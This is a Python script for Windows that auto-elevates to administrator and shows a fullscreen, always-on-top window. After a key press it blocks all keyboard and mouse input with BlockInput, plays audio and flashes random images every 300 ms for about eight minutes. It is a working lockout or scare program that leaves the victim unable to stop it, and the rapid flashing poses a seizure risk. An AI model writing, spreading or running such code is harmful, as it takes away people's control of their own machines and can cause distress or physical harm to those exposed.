import tkinter as tk
import random
import os
import winsound
import ctypes
import sys

# --- Configuration ---
FLASH_DURATION_MS = 500000
FLASH_INTERVAL_MS = 300
IMAGE_FILES = ["EA1.png", "EA3.png", "EA4.png", "EA5.png"]
AUDIO_FILE = "AU1.wav"
# ----------------------

user32 = ctypes.windll.user32

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Auto-elevate if not already running as admin
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join([f'"{arg}"' for arg in sys.argv]), None, 1
    )
    sys.exit()

def block_input(block: bool) -> bool:
    return bool(user32.BlockInput(block))

class FlashShow:
    def __init__(self, root):
        self.root = root
        self.root.title("")
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="black")

        # Solid black screen from the start (no transparency)
        self.canvas = tk.Canvas(root, bg="black", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)

        self.running = False
        self.started = False
        self.input_blocked = False

        self.root.bind("<Key>", self._on_key_press)
        self.root.protocol("WM_DELETE_WINDOW", self._cleanup_and_quit)

        # Force focus
        self.root.focus_force()
        self.root.lift()

        self.images = self._load_images()
        self.audio_path = self._find_audio()

    def _load_images(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        images = []
        for filename in IMAGE_FILES:
            path = os.path.join(script_dir, filename)
            if not os.path.isfile(path):
                print(f"Missing: {filename}")
                continue
            try:
                images.append(tk.PhotoImage(file=path))
            except tk.TclError:
                print(f"Skipping (unsupported format): {filename}")
        return images

    def _find_audio(self):
        script_dir = os.path.dirname(os.path.abspath(__file__))
        path = os.path.join(script_dir, AUDIO_FILE)
        if os.path.isfile(path) and path.lower().endswith(".wav"):
            return path
        return None

    def _on_key_press(self, event):
        if not self.started:
            self.start_flashing()

    def start_flashing(self):
        if not self.images:
            print("No images found – quitting.")
            self._cleanup_and_quit()
            return

        self.started = True
        self.running = True
        self.elapsed = 0

        # Block keyboard + mouse
        success = block_input(True)
        self.input_blocked = success
        if success:
            print("Input blocked.")
        else:
            print("Failed to block input.")

        if self.audio_path:
            winsound.PlaySound(
                self.audio_path,
                winsound.SND_FILENAME | winsound.SND_ASYNC
            )

        self._flash_frame()

    def _flash_frame(self):
        if not self.running or self.elapsed >= FLASH_DURATION_MS:
            self._cleanup_and_quit()
            return

        self.canvas.delete("all")
        w = self.root.winfo_screenwidth()
        h = self.root.winfo_screenheight()
        img = random.choice(self.images)
        self.canvas.create_image(w // 2, h // 2, image=img, anchor="center")

        self.elapsed += FLASH_INTERVAL_MS
        self.root.after(FLASH_INTERVAL_MS, self._flash_frame)

    def _cleanup_and_quit(self):
        if self.input_blocked:
            block_input(False)
            self.input_blocked = False
            print("Input unblocked.")
        winsound.PlaySound(None, winsound.SND_PURGE)
        self.running = False
        self.root.destroy()

def main():
    root = tk.Tk()
    app = FlashShow(root)
    root.mainloop()

if __name__ == "__main__":
    main()
